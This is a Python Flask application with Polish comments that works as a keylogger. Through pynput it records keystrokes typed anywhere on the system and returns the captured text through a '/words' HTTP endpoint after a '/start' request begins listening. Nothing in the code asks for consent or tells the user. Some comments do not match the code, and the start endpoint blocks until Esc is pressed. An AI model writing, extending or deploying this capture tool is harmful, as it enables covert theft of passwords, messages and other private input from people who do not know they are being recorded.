from flask import Flask, request, jsonify
from pynput import keyboard
import json

app = Flask(__name__)

# Zmienna przechowująca wpisane słowa
wpisane_slowa = []

# Funkcja obsługująca naciśnięcie klawisza
# Funkcja obsługująca naciśnięcie klawisza
def on_press(key):
    global wpisane_slowa
    try:
        # Jeśli wpisany klawisz jest literą lub spacją, dodaj go do listy wpisanych słów
        if key.char.isalpha():
            wpisane_slowa.append(key.char)
        elif key.char.isspace():
            wpisane_slowa.append('*SPACE*')  # Zamiana spacji na dwie podkreślenia
        elif key == keyboard.KeyCode.from_char('\n'):
            wpisane_slowa.append('*ENTER*')  # Zamiana enteru na "*ENTER*"
    except AttributeError:
        # Jeśli wpisany klawisz nie jest literą ani spacją, zignoruj go
        if key == keyboard.Key.space:
            wpisane_slowa.append('*SPACE*')  # Zamiana spacji na dwie podkreślenia
        elif key == keyboard.Key.enter:
            wpisane_slowa.append('*ENTER*')  # Zamiana enteru na "*ENTER*"
        pass


# Funkcja obsługująca zwolnienie klawisza
def on_release(key):
    # Jeśli zwolniony klawisz to klawisz Esc, zakończ nasłuchiwanie
    if key == keyboard.Key.esc:
        return False

# Endpoint do rozpoczęcia nasłuchiwania
@app.route('/start', methods=['POST'])
def start():
    global wpisane_slowa
    wpisane_slowa = []  # Resetowanie listy wpisanych słów
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    return jsonify({'message': 'Nasłuchiwanie rozpoczęte.'})

# Endpoint do pobrania wpisanych słów
@app.route('/words', methods=['GET'])
def words():
    global wpisane_slowa
    response = {'words': ''.join(wpisane_slowa).replace('*SPACE*', ' ')} # Zamiana podkreśleń na spacje
    return json.dumps(response, separators=('', ':'))

if __name__ == '__main__':
    app.run(debug=True)
